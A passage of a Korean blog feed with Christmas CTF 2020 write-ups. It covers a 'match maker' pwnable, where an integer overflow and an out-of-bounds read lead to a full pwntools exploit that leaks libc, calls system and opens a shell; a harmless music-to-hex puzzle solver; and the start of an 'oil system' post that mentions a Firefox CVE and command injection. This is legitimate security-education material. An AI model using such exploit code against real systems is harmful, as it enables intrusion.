    <content type="html"><![CDATA[<h1 id="ë¬¸ì œ-ê°œìš”"><a href="#ë¬¸ì œ-ê°œìš”" class="headerlink" title="ë¬¸ì œ ê°œìš”"></a>ë¬¸ì œ ê°œìš”</h1><p><img src="/2020/12/29/fabu1ous/match-maker/1.png"></p><ol><li><p>í”„ë¡œí•„ì„ ë§Œë“­ë‹ˆë‹¤.</p><ul><li>ì´ë¦„, ë‚˜ì´, ì„±ë³„, ì·¨ë¯¸ë¥¼ ì…ë ¥</li><li>ë‚˜ì´ ì •ë³´ì— ë”°ë¼ íŒŒíŠ¸ë„ˆ ë§¤ì¹­ í•¨ìˆ˜ê°€ ë‹¬ë¼ì§</li></ul></li><li><p>ë§Œë“  í”„ë¡œí•„ì„ ì €ì¥í•©ë‹ˆë‹¤.</p><ul><li>ë§Œë“¤ì–´ì§„ í”„ë¡œí•„ì„ í™ì— ì €ì¥</li><li>ì„±ë³„ì„ êµ¬ë¶„í•˜ì—¬ ì „ì—­ ë°°ì—´ì— í™ ì£¼ì†Œ ì €ì¥.</li></ul></li><li><p>íŒŒíŠ¸ë„ˆ ë§¤ì¹­ì„ í•©ë‹ˆë‹¤.</p></li><li><p>ë§¤ì¹­ ëœ íŒŒíŠ¸ë„ˆì˜ ì •ë³´ë¥¼ ì¶œë ¥í•©ë‹ˆë‹¤.</p></li><li><p>ìœ ì € ë¦¬ìŠ¤íŠ¸ë¥¼ ì¶œë ¥í•©ë‹ˆë‹¤.</p><ul><li>í˜„ì¬ í”„ë¡œí•„ì´ ë‚¨ìë©´ ì—¬ì ë¦¬ìŠ¤íŠ¸ë¥¼ ì¶œë ¥</li><li>í˜„ì¬ í”„ë¡œí•„ì´ ì—¬ìë©´ ë‚¨ì ë¦¬ìŠ¤íŠ¸ë¥¼ ì¶œë ¥</li></ul></li></ol><h1 id="í’€ì´-ìš”ì•½"><a href="#í’€ì´-ìš”ì•½" class="headerlink" title="í’€ì´ ìš”ì•½"></a>í’€ì´ ìš”ì•½</h1><p>find match ê¸°ëŠ¥ì—ì„œ ì‚¬ìš©í•  ì•Œê³ ë¦¬ì¦˜ì„ ì •í•˜ëŠ” ë¡œì§ì´ ì¡´ì¬í•©ë‹ˆë‹¤. pref_min_age != pref_max_ageì´ë©´ì„œ pref_min_age ^ 2 == pref_max_age ^ 2 ì¼ ë•Œ ì´ˆê¸°í™”ë˜ì§€ ì•Šì€ ìŠ¤íƒì˜ ì“°ë ˆê¸° ê°’ìœ¼ë¡œ ripë¥¼ ì¡°ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. int-overflowë¥¼ í™œìš©í•˜ë©´ ë©ë‹ˆë‹¤.</p><p>show user list ê¸°ëŠ¥ì—ì„œ user listë¥¼ ì°¸ì¡°í•  ë•Œ sex ^1ì„ indexë¡œ ì‚¬ìš©í•©ë‹ˆë‹¤. í”„ë¡œí•„ ì‘ì„± ì‹œ ì„±ë³„ ì…ë ¥ê°’ì— ì œí•œì´ ì—†ê¸° ë•Œë¬¸ì— ì´ë¥¼ ì´ìš©í•´ ë°”ì´ë„ˆë¦¬ baseì£¼ì†Œì™€ libc base ì£¼ì†Œë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h1 id="ì·¨ì•½ì "><a href="#ì·¨ì•½ì " class="headerlink" title="ì·¨ì•½ì "></a>ì·¨ì•½ì </h1><ul><li>int overflow â†’ uninitialized stack</li></ul><p><img src="/2020/12/29/fabu1ous/match-maker/2.png"></p><p>í”„ë¡œí•„ ìƒì„± ë©”ë‰´ì—ì„œ ì…ë ¥ë°›ì€ ë‚˜ì´ ì •ë³´ë¥¼ í† ëŒ€ë¡œ íŒŒíŠ¸ë„ˆ ë§¤ì¹­ ë£¨í‹´ì„ ì •í•˜ëŠ” ì½”ë“œì…ë‹ˆë‹¤. ifâ€¦elseê°€ ì•„ë‹Œ ifâ€¦if ì´ë¯€ë¡œ integer overflowë¥¼ ë°œìƒì‹œì¼œ <code>(void*)func()</code>ì˜ ê°’ì„ ìŠ¤íƒì— ìˆë˜ ì“°ë ˆê¸° ê°’ìœ¼ë¡œ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/12/29/fabu1ous/match-maker/3.png"></p><p>ì—°ìƒ í˜¹ì€ ì—°í•˜ ì¤‘ ì„ í˜¸í•˜ëŠ” ìª½ì„ ê³„ì‚°í•˜ëŠ” ë£¨í‹´ì—ì„œ ì ˆëŒ“ê°’ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. ì…ë ¥í•  ìˆ˜ ìˆëŠ” ë‚˜ì´ì— ìµœëŒ“ê°’ ì œí•œì´ ì—†ê¸° ë•Œë¬¸ì— int overflowë¥¼ ë°œìƒì‹œì¼œ ìŠ¤íƒ ë³€ìˆ˜ <code>(void*)func()ë¥¼</code> ì´ˆê¸°í™”í•˜ëŠ” ì‘ì—…ì„ ê±´ë„ˆë›¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/12/29/fabu1ous/match-maker/4.png"></p><p><code>(void*)func()</code>ê°’ì— ì˜í–¥ì„ ë¯¸ì¹˜ëŠ” ì“°ë ˆê¸° ê°’ì€ nameì„ ì…ë ¥ë°›ì„ ë•Œ ì‚¬ìš©í•˜ë˜ ë²„í¼ì…ë‹ˆë‹¤.</p><p><img src="/2020/12/29/fabu1ous/match-maker/5.png"></p><p>ë©”ì¸ ë©”ë‰´ì—ì„œ find matchë¥¼ ì„ íƒí•˜ë©´ ripê°€ ì¡íˆëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ul><li>out of bound read</li></ul><p><img src="/2020/12/29/fabu1ous/match-maker/6.png"></p><p>ì„±ë³„ì€ intë¡œ ì…ë ¥ë°›ìŠµë‹ˆë‹¤.</p><p>0 : ë‚¨ì</p><p>1 : ì—¬ì</p><p><img src="/2020/12/29/fabu1ous/match-maker/7.png"></p><p>í˜„ì¬ í”„ë¡œí•„ì´ ë‚¨ìë©´ ì—¬ì ìœ ì € ë¦¬ìŠ¤íŠ¸ë¥¼, ì—¬ìë©´ ë‚¨ì ë¦¬ìŠ¤íŠ¸ë¥¼ ì¶œë ¥í•´ì£¼ëŠ” í•¨ìˆ˜ì…ë‹ˆë‹¤. 0ë„ 1ë„ ì•„ë‹Œ ë‹¤ë¥¸ ê°’ì„ ì„±ë³„ë¡œ ì…ë ¥í•˜ë©´ oob-readê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤. binaryì˜ baseì£¼ì†Œ, libcì˜ baseì£¼ì†Œë¥¼ leak í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&#x27;./match&#x27;</span>)<span class="hljs-comment">#gdb.attach(p)</span><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make</span>(<span class="hljs-params">age, name, Pmin, Pmax, sex</span>):</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;age: &#x27;</span>, age)p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>, name)p.sendlineafter(<span class="hljs-string">&#x27;min age limit for you: &#x27;</span>, Pmin)p.sendlineafter(<span class="hljs-string">&#x27;max age limit for you: &#x27;</span>, Pmax)p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, sex)p.sendlineafter(<span class="hljs-string">&#x27;enter hobby 1 : &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;enter hobby 2 : &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;enter hobby 3 : &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">save</span>():</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find</span>():</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">showL</span>():</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<span class="hljs-comment"># leak bin base</span>make(<span class="hljs-string">&#x27;65536&#x27;</span>, <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">16</span>+<span class="hljs-string">b&#x27;BBBBBBBB&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;196608&#x27;</span>, <span class="hljs-string">&#x27;-2&#x27;</span>)showL()p.recvuntil(<span class="hljs-string">&#x27;[potential partners]\\n0. &#x27;</span>)leak = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\\x00\\x00&#x27;</span>)bin_base = leak - <span class="hljs-number">0x5008</span>log.info(hex(bin_base))<span class="hljs-comment"># leak read@libc</span>make(<span class="hljs-string">&#x27;65536&#x27;</span>, p64(bin_base+<span class="hljs-number">0x4fa0</span>)+<span class="hljs-string">b&#x27;BBBBBBBBCCCCCCCC&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;196608&#x27;</span>, <span class="hljs-string">&#x27;23&#x27;</span>)save()showL()p.recvuntil(<span class="hljs-string">&#x27;[potential partners]\\n0. &#x27;</span>)leak = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\\x00\\x00&#x27;</span>)system = leak - <span class="hljs-number">0xbbd20</span>log.info(hex(system))make(<span class="hljs-string">&#x27;65536&#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh;&#x27;</span>+<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">8</span>+p64(system), <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;196608&#x27;</span>, <span class="hljs-string">&#x27;23&#x27;</span>)find()p.interactive()</code></pre><pre><code class="hljs plain">[+] Opening connection to localhost on port 1234: Done[*] 0x55ad3a345000[*] 0x7f414a9ec410[*] Switching to interactive mode$ cat flagXMAS&#123;1_d0n7_w4nna_kn0w_who&#39;5_tak1ng_U_h0me&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>pwnable</tag>
      
      <tag>oob</tag>
      
      <tag>uninitialized stack</tag>
      
      <tag>integer overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - No g</title>
    <link href="/2020/12/29/fabu1ous/no-g/"/>
    <url>/2020/12/29/fabu1ous/no-g/</url>
    
    <content type="html"><![CDATA[<h1 id="ë¬¸ì œ-ê°œìš”"><a href="#ë¬¸ì œ-ê°œìš”" class="headerlink" title="ë¬¸ì œ ê°œìš”"></a>ë¬¸ì œ ê°œìš”</h1><p><img src="/2020/12/29/fabu1ous/no-g/1.png"></p><p>ìŒê³„(Scale)ë¥¼ ì•ŒíŒŒë²³ìœ¼ë¡œ ë‚˜íƒ€ë‚´ê³¤ í•©ë‹ˆë‹¤. ìŒì´ë¦„ì´ë¼ê³  í•˜ì£ .</p><p>ë¼(A), ì‹œ(B), ë„(C), ë ˆ(D), ë¯¸(E) , íŒŒ(F), ì†”(G)</p><p>16ì§„ìˆ˜(HEX) ë˜í•œ ì•ŒíŒŒë²³ì„ ì‚¬ìš©í•´ ìˆ˜ë¥¼ í‘œí˜„í•©ë‹ˆë‹¤.</p><p>10(A), 11(B), 12(C), 13(D), 14(E), 15(F)</p><p><img src="/2020/12/29/fabu1ous/no-g/hint.jpg"></p><p>ì•…ë³´ì— ê·¸ë ¤ì§„ ìŒí‘œë¥¼ ì•ŒíŒŒë²³ìœ¼ë¡œ, ê·¸ ì•ŒíŒŒë²³ì„ hexê°’ìœ¼ë¡œ ì¹˜í™˜í•˜ê³  ì—°ê²°ëœ ìŒí‘œë“¤ë¼ë¦¬ hexê°’ì„ ë”í•´ ASCIIë¡œ ë³€í™˜í•˜ë©´ í•˜ë‚˜ì˜ ë¬¸ìê°€ ë©ë‹ˆë‹¤.</p><p>ì˜ˆ ) ë¼ë¼ë¼ â†’ chr(0xa+0xa+0xa) â†’ â€˜\x1eâ€™</p><p>hexì—ëŠ” Gê°€ ì—†ê¸° ë•Œë¬¸ì— ì•…ë³´ì˜ ì œëª©ì´ â€˜No Gâ€™ì…ë‹ˆë‹¤. </p><p>ì œê°€ ì˜ë„í•œ í’€ì´ ì ‘ê·¼ ë°©ì‹ì€ ì´ë ‡ìŠµë‹ˆë‹¤.</p><ol><li>ì œëª©ì—ì„œ íŒíŠ¸ë¥¼ ì–»ì–´ ìŒì´ë¦„ì„ ì°¾ì•„ë³¸ë‹¤.</li><li>ì²« ì—¬ì„¯ ìŒì˜ hexê°’ì„ ë”í•´ë´¤ë”ë‹ˆ â€˜Xâ€™ê°€ ë‚˜ì˜¨ë‹¤.</li><li>flag í˜•ì‹ì´ â€˜XMAS{}â€™ì´ë¯€ë¡œ 2ë²ˆ ê³¼ì •ì„ ëª‡ ë²ˆ ë” ë°˜ë³µí•´ ë³¸ë‹¤.</li></ol><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><pre><code class="hljs python">note = [<span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>]idx = [<span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>]flag = []pre_chk = <span class="hljs-number">0</span><span class="hljs-keyword">while</span>(len(flag) &lt; len(idx)):cur_chk = idx[len(flag)]buf = note[pre_chk:pre_chk+cur_chk]result = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(buf)): <span class="hljs-keyword">if</span>(buf[i] == <span class="hljs-string">&#x27;la&#x27;</span>): result += <span class="hljs-number">0xa</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&#x27;ti&#x27;</span>): result += <span class="hljs-number">0xb</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&#x27;do&#x27;</span>): result += <span class="hljs-number">0xc</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&#x27;re&#x27;</span>): result += <span class="hljs-number">0xd</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&#x27;mi&#x27;</span>): result += <span class="hljs-number">0xe</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&#x27;fa&#x27;</span>): result += <span class="hljs-number">0xf</span>flag.append(chr(result))print(<span class="hljs-string">&#x27;&#x27;</span>.join(flag))pre_chk += cur_chk</code></pre><pre><code class="hljs plain">XXMXMAXMASXMAS&#123;XMAS&#123;7XMAS&#123;7hXMAS&#123;7heXMAS&#123;7herXMAS&#123;7her3XMAS&#123;7her3_XMAS&#123;7her3_iXMAS&#123;7her3_i5XMAS&#123;7her3_i5_XMAS&#123;7her3_i5_nXMAS&#123;7her3_i5_noXMAS&#123;7her3_i5_no_XMAS&#123;7her3_i5_no_GXMAS&#123;7her3_i5_no_G_XMAS&#123;7her3_i5_no_G_iXMAS&#123;7her3_i5_no_G_inXMAS&#123;7her3_i5_no_G_in_XMAS&#123;7her3_i5_no_G_in_HXMAS&#123;7her3_i5_no_G_in_H3XMAS&#123;7her3_i5_no_G_in_H3XXMAS&#123;7her3_i5_no_G_in_H3X&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>misc</tag>
      
      <tag>scale</tag>
      
      <tag>hex</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - oil system</title>
    <link href="/2020/12/29/fabu1ous/oil-system/"/>
    <url>/2020/12/29/fabu1ous/oil-system/</url>
    
    <content type="html"><![CDATA[<h1 id="ë¨¸ë¦¿ë§"><a href="#ë¨¸ë¦¿ë§" class="headerlink" title="ë¨¸ë¦¿ë§"></a>ë¨¸ë¦¿ë§</h1><p>CVE-2020â€“15647ëŠ” Firefox Fennec v68.9.0ì—ì„œ ë°œìƒí•˜ëŠ” Arbitrary local file accessì…ë‹ˆë‹¤. íŒŒì¼ì„ Cache í•  ë•Œ í•´ë‹¹ íŒŒì¼ì˜ ì´ë¦„ì„ í•´ì‰¬ í•´ì•¼ í•˜ì§€ë§Œ Firefox Fennec v68.9.0ì˜ <code>content:// URI</code> ë¡œì§ì—” ì¡´ì¬í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì— Arbitrary local file accessê°€ ë°œìƒí•©ë‹ˆë‹¤. ì´ëŸ° ìƒí™©ì„ pwnable ë¬¸ì œë¡œ êµ¬í˜„í•´ë´¤ëŠ”ë°â€¦</p><p><img src="/2020/12/29/fabu1ous/oil-system/1.png"></p><p>unintended solutionìœ¼ë¡œ ì»¤ë©˜ë“œ ì¸ì ì…˜ì´ ì¡´ì¬í•©ë‹ˆë‹¤. ìƒìœ„ê¶Œ ì†”ë¸Œê°€ ëª¨ë‘ ì»¤ë©˜ë“œ ì¸ì ì…˜ì´ë”êµ°ìš”â€¦ í•˜í•˜í•˜. ë¬¸ì œ ê²€ìˆ˜ ë‹¨ê³„ì—ì„œ ì»¤ë©˜ë“œ ì¸ì ì…˜ì— ëŒ€í•œ ë§ì´ ë‚˜ì™€ì„œ ìˆ˜ì •í•˜ê³  ê²€ì¦ê¹Œì§€ í–ˆëŠ”ë° ìˆ˜ì • ì•ˆëœ ë²„ì „ì´ ëŒ€íšŒ ë•Œ ì˜¬ë¼ê°”ë„¤ìš”.</p><p>oil-system ë¬¸ì œë¥¼ í’€ì–´ì£¼ì‹  ë¶„ë“¤ê»˜ ì •ë§ ì£„ì†¡í•©ë‹ˆë‹¤. ì¡°ê¸ˆ ë” ì² ì €í•˜ê²Œ ì¤€ë¹„í–ˆì–´ì•¼ ëëŠ”ë°â€¦</p><h1 id="í’€ì´-ìš”ì•½"><a href="#í’€ì´-ìš”ì•½" class="headerlink" title="í’€ì´ ìš”ì•½"></a>í’€ì´ ìš”ì•½</h1><p><img src="/2020/12/29/fabu1ous/oil-system/2.png"></p><p><img src="/2020/12/29/fabu1ous/oil-system/3.png"></p><p>ë¬¸ì œ ë°”ì´ë„ˆë¦¬ëŠ” subleqì´ë¼ëŠ” One-Instruction-Language system ì—ë®¬ë ˆì´í„°ì…ë‹ˆë‹¤. subleq ì½”ë“œë¥¼ ë‹´ê³  ìˆëŠ” íŒŒì¼ì—ì„œ ë°ì´í„°ë¥¼ ì½ì–´ì™€ ìŠ¤íƒì— ì €ì¥í•˜ê³  ê·¸ ì½”ë“œë¥¼ í•´ì„í•´ ë™ì‘í•©ë‹ˆë‹¤. subleqì½”ë“œë¥¼ í•´ì„í•˜ëŠ” í•¨ìˆ˜ì— OOB ì·¨ì•½ì ì´ ì¡´ì¬í•´ ë¦¬í„´ ê°’ì„ ì¡°ì‘í•  ìˆ˜ 